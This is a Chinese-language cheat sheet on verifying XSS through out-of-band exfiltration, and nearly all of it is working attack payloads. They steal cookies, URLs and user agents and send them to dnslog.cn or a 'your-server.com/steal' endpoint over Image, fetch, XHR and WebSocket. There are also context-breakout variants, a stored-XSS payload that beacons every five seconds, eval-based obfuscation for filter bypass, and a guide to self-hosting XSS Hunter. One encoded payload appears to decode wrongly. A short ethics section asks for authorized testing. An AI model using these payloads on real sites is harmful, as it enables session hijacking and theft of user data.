# XSS 外带验证速查表

## 📋 目录

1. [外带验证概述](#外带验证概述)
2. [DNSLog.cn 速查](#dnslogcn-速查)
3. [HTTP 外带速查](#http-外带速查)
4. [WebSocket 外带速查](#websocket-外带速查)
5. [其他验证方法](#其他验证方法)
6. [外带服务对比](#外带服务对比)
7. [实战案例速查](#实战案例速查)

---

## 外带验证概述

### 为什么使用外带验证？

**Alert 弹窗的缺点**：
- ❌ 需要用户交互才能看到结果
- ❌ 容易被目标系统察觉
- ❌ 无法证明数据外带能力
- ❌ 不适合自动化测试

**外带验证的优点**：
- ✅ 无需用户交互，自动触发
- ✅ 隐蔽性强，不易被察觉
- ✅ 可以获取敏感信息（cookie、URL、referrer 等）
- ✅ 证明数据外带能力
- ✅ 适合自动化测试和批量验证
- ✅ 为漏洞报告提供有力证据

---

## DNSLog.cn 速查

### 基础 DNS 外带

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/your-unique-id";
</script>
```

### 获取 Cookie

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + document.cookie;
</script>
```

### Base64 编码 Cookie

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + btoa(document.cookie);
</script>
```

### 获取多种信息

```javascript
<script>
var img = new Image();
var data = {
    cookie: document.cookie,
    url: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    title: document.title
};
img.src = "http://www.dnslog.cn/" + btoa(JSON.stringify(data));
</script>
```

### 持续监控

```javascript
<script>
setInterval(function(){
    var img = new Image();
    img.src = "http://www.dnslog.cn/stored-xss-" + Date.now() + "-" + document.cookie;
}, 5000);
</script>
```

### 不同上下文

**HTML 属性**：
```javascript
" onerror="var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie" x="
```

**JavaScript 字符串**：
```javascript
');var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie;//
```

**URL 参数**：
```javascript
#<script>var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie</script>
```

**HTML 注释**：
```javascript
--><script>var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie</script>
```

### 编码绕过

**Unicode 编码**：
```javascript
<script>
var i=new Image();
i.src='http://www.dnslog.cn/'+eval(String.fromCharCode(100,111,99,117,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));
</script>
```

**十六进制编码**：
```javascript
<script>
var i=new Image();
i.src='http://www.dnslog.cn/'+eval('\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65');
</script>
```

---

## HTTP 外带速查

### Fetch API

```javascript
<script>
fetch('http://your-server.com/steal?data=' + encodeURIComponent(document.cookie));
</script>
```

### Fetch API POST

```javascript
<script>
var data = {
    cookie: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent
};
fetch('http://your-server.com/steal', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
</script>
```

### XMLHttpRequest GET

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://your-server.com/steal?data=' + encodeURIComponent(document.cookie), true);
xhr.send();
</script>
```

### XMLHttpRequest POST

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://your-server.com/steal', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('data=' + encodeURIComponent(document.cookie));
</script>
```

### Image 外带（最常用）

```javascript
<script>
var img = new Image();
img.src = 'http://your-server.com/steal?data=' + encodeURIComponent(document.cookie);
</script>
```

---

## WebSocket 外带速查

### 基础 WebSocket

```javascript
<script>
var ws = new WebSocket('ws://your-server.com/' + document.cookie);
ws.onopen = function() {
    ws.send('XSS verified');
};
</script>
```

### 完整 WebSocket

```javascript
<script>
var data = {
    cookie: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent
};
var ws = new WebSocket('ws://your-server.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify(data));
};
</script>
```

---

## 其他验证方法

### 修改页面内容

```javascript
<script>
document.body.innerHTML = '<h1>XSS 漏洞已验证</h1>';
document.title = 'XSS 漏洞已验证';
</script>
```

### 控制台日志

```javascript
<script>
console.log('XSS 漏洞已验证: ' + document.cookie);
console.log('URL: ' + window.location.href);
</script>
```

### 组合多种验证方法

```javascript
<script>
// 方法 1：DNS 外带
var i = new Image();
i.src = 'http://www.dnslog.cn/combined-' + document.cookie;

// 方法 2：控制台日志
console.log('XSS Verified:', document.cookie);

// 方法 3：修改页面标题
document.title = 'XSS 漏洞已验证';

// 方法 4：修改页面内容
document.body.innerHTML = '<h1>XSS 漏洞已验证</h1>';
</script>
```

---

## 外带服务对比

| 服务 | 官方网站 | 优点 | 缺点 | 适用场景 |
|------|----------|------|------|---------|
| **DNSLog.cn** | http://www.dnslog.cn/ | 免费、无需注册、实时查看 | 依赖网络连接、可能被拦截 | 快速验证、自动化测试 |
| **Burp Collaborator** | https://portswigger.net/burp/documentation/collaborator | 支持多种协议、实时接收 | 需要 Burp Suite | 专业渗透测试 |
| **XSS Hunter** | https://xsshunter.com/（已弃用）<br>自建：https://github.com/mandatoryprogrammer/xsshunter-express | 自动收集、详细报告、完整页面截图 | 需要自建、需要 Docker | 长期监控、漏洞收集、专业渗透测试 |
| **RequestBin** | https://requestbin.com/ | 免费、实时查看 HTTP | 仅支持 HTTP | HTTP 请求分析 |
| **Webhook.site** | https://webhook.site/ | 免费、支持多种格式 | 仅支持 Webhook | Webhook 测试 |
| **DNSBin** | https://dnsbin.zhack.ca/ | 免费、实时查看 DNS | 仅支持 DNS | DNS 查询验证 |

---

## 外带服务详细说明

### DNSLog.cn

**官方网站**：http://www.dnslog.cn/

**特点**：
- 免费、无需注册
- 实时查看 DNS 查询记录
- 支持自定义子域名

**使用方法**：
1. 访问 `http://www.dnslog.cn/`
2. 查看当前可用的子域名
3. 在 Payload 中使用该子域名
4. 刷新页面查看 DNS 查询记录

### Burp Collaborator

**官方网站**：https://portswigger.net/burp/documentation/collaborator

**特点**：
- Burp Suite 自带
- 支持 DNS、HTTP、SMTP 等多种协议
- 实时接收和查看外带数据

**安装方法**：
1. 下载 Burp Suite：https://portswigger.net/burp/releases
2. 安装 Burp Suite Professional（或使用免费版）
3. 启动 Burp Suite
4. 在 Burp Suite 菜单中选择 "Burp Collaborator Client"

**使用方法**：
1. 打开 Burp Suite
2. 进入 Burp Collaborator Client
3. 生成一个新的 Collaborator Payload
4. 在测试中使用该 Payload
5. 在 Collaborator Client 中查看结果

### XSS Hunter

**官方网站**：https://xsshunter.com/（已弃用）

**自建服务**：https://github.com/mandatoryprogrammer/xsshunter-express

**特点**：
- 专业的 XSS 测试平台
- 自动收集漏洞信息
- 提供详细的漏洞报告
- 支持自建服务，无需依赖第三方

**使用方法（在线服务）**：
1. 访问 https://xsshunter.com/
2. 注册 XSS Hunter 账户
3. 获取专属的 Payload（形如 `https://your-xsshunter-payload.com/xss.js`）
4. 在测试中使用该 Payload
5. 在 XSS Hunter 平台查看结果

**自建服务方法（推荐）**：

由于官方 XSS Hunter 服务已弃用，推荐使用 XSS Hunter Express 自建服务。

**系统要求**：
- 安装 Docker 和 docker-compose
- 至少 2GB RAM 的主机
- 一个主机名（如 host.example.com），可以映射到服务器 IP（需要 DNS 控制权）
- [邮件通知] 需要 SMTP 凭据的邮箱账户（可选）

**配置步骤**：

1. **克隆仓库**：
   ```bash
   git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
   cd xsshunter-express
   ```

2. **修改 docker-compose.yaml**：
   ```yaml
   # 必需配置
   HOSTNAME: 设置为你的主机名（如 xss.ht），越短越好
   SSL_CONTACT_EMAIL: 用于自动设置和续订 TLS/SSL 证书的邮箱地址
   
   # 可选配置（邮件通知）
   SMTP_EMAIL_NOTIFICATIONS_ENABLED: 启用邮件通知
   SMTP_HOST: SMTP 服务器主机（如 smtp.gmail.com）
   SMTP_PORT: SMTP 服务器端口（如 465）
   SMTP_USE_TLS: 是否使用 TLS
   SMTP_USERNAME: 邮箱用户名
   SMTP_PASSWORD: 邮箱密码
   SMTP_FROM_EMAIL: 发件邮箱地址
   SMTP_RECEIVER_EMAIL: 接收通知的邮箱地址
   
   # 安全配置
   CONTROL_PANEL_ENABLED: 禁用 Web 控制面板以最小化攻击面
   ```

3. **启动服务**：
   ```bash
   # 启动 PostgreSQL 数据库
   docker-compose up -d postgresdb
   
   # 启动 XSS Hunter Express
   docker-compose up xsshunterexpress
   ```

4. **访问管理面板**：
   - 首次启动会显示管理员密码
   - 访问 `https://your-hostname.com/admin/`
   - 使用显示的密码登录

**功能特性**：

- **强大的 XSS 探针**：每次触发时收集以下信息
  - 漏洞页面的 URI
  - 执行来源
  - 受害者 IP 地址
  - 页面 Referer
  - 受害者 User Agent
  - 所有非 HTTP-Only Cookie
  - 页面完整 HTML DOM
  - 受影响页面的完整截图
  - 负责的 HTTP 请求
  - 浏览器报告的时间
  - Payload 是否在 iframe 中触发

- **完全 Docker 化**：修改配置后使用单个命令启动
- **自动 TLS/SSL 设置和续订**：自动使用 LetsEncrypt 设置和续订证书
- **Gzip 压缩**：所有图像使用 gzip 压缩，减少磁盘空间使用
- **最小化攻击面**：可选禁用 Web UI
- **完整页面截图**：使用 HTML5 canvas API 生成完整截图
- **邮件报告**：发送详细的邮件报告
- **自动 Payload 生成**：自动生成 XSS Payload
- **关联注入**：关联注入尝试和 Payload 触发

**注意事项**：
- 首次 HTTP 请求会较慢（约 15 秒），因为服务会自动生成 TLS/SSL 证书
- 建议使用简短的主机名（如 xss.ht），以便 Payload 可以适应各种测试字段
- 如果不需要 Web UI，可以禁用控制面板以最小化攻击面

### RequestBin

**官方网站**：https://requestbin.com/

**特点**：
- 免费、无需注册
- 实时查看 HTTP 请求
- 支持查看请求头和请求体

**使用方法**：
1. 访问 `https://requestbin.com/`
2. 创建一个新的 RequestBin
3. 获取 RequestBin URL
4. 在 Payload 中使用该 URL
5. 在 RequestBin 页面查看请求

### Webhook.site

**官方网站**：https://webhook.site/

**特点**：
- 免费、无需注册
- 实时查看 Webhook 请求
- 支持多种数据格式

**使用方法**：
1. 访问 `https://webhook.site/`
2. 获取专属的 Webhook URL
3. 在 Payload 中使用该 URL
4. 在 Webhook.site 页面查看请求

### DNSBin

**官方网站**：https://dnsbin.zhack.ca/

**特点**：
- 免费、无需注册
- 实时查看 DNS 查询
- 支持自定义子域名

**使用方法**：
1. 访问 `https://dnsbin.zhack.ca/`
2. 生成一个新的 DNS 记录
3. 在 Payload 中使用该记录
4. 在 DNSBin 页面查看查询

---

## 实战案例速查

### 反射型 XSS

**目标**：`http://example.com/search?q=test`

**Payload**：
```javascript
"><script>var i=new Image();i.src='http://www.dnslog.cn/xss-'+document.cookie;</script>
```

### 存储型 XSS

**注入点**：用户评论或个人资料

**Payload**：
```javascript
</textarea><script>
setInterval(function(){
    var i=new Image();
    i.src='http://www.dnslog.cn/stored-xss-'+Date.now()+'-'+btoa(document.cookie);
}, 5000);
</script>
```

### DOM 型 XSS

**注入点**：URL hash 或 search 参数

**Payload**：
```javascript
#<script>
var i=new Image();
i.src='http://www.dnslog.cn/dom-xss-'+btoa(document.cookie);
</script>
```

### 过滤绕过 + DNS 外带

**过滤规则**：过滤 `alert`、`script`、`cookie`

**Payload**：
```javascript
<ſvg/onload="var i=new Image();i.src='http://www.dnslog.cn/'+btoa(eval(String.fromCharCode(100,111,99,117,101,110,116,46,99,111,111,107,105,101,65,100,100,114,101,115,115)))">
```

---

## 编码速查

### Base64 编码

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + btoa(document.cookie);
</script>
```

### URL 编码

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + encodeURIComponent(document.cookie);
</script>
```

### Unicode 编码

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + eval(String.fromCharCode(100,111,99,117,101,110,116,46,99,111,111,107,105,101));
</script>
```

### 十六进制编码

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + eval('\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65');
</script>
```

---

## 安全测试建议

### 道德准则

- ⚠️ **仅限授权测试**：只在获得明确授权的范围内进行测试
- ⚠️ **不要窃取真实数据**：使用测试标识，不要获取真实用户数据
- ⚠️ **及时报告漏洞**：发现漏洞后及时向目标报告
- ⚠️ **遵守法律法规**：遵守所在国家和地区的相关法律法规

### 测试标识

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/test-xss-" + document.cookie;
</script>
```

### 数据保护

- **不要在 DNS 查询中发送真实敏感数据**
- **使用加密或编码保护测试数据**
- **测试完成后删除相关记录**

---

## 最佳实践

### 选择合适的外带服务

- **DNSLog.cn**：适合快速验证、自动化测试
- **Burp Collaborator**：适合专业渗透测试
- **XSS Hunter**：适合长期监控、漏洞收集
- **RequestBin/Webhook.site**：适合 HTTP 请求分析

### Payload 设计原则

1. **简洁性**：Payload 尽量简洁，减少被过滤的风险
2. **隐蔽性**：使用编码、混淆等技术提高隐蔽性
3. **可靠性**：确保 Payload 在不同环境下都能正常工作
4. **可追溯性**：使用测试标识，便于追踪和清理

---

**文档版本**: 1.0
**最后更新**: 2026-02-09
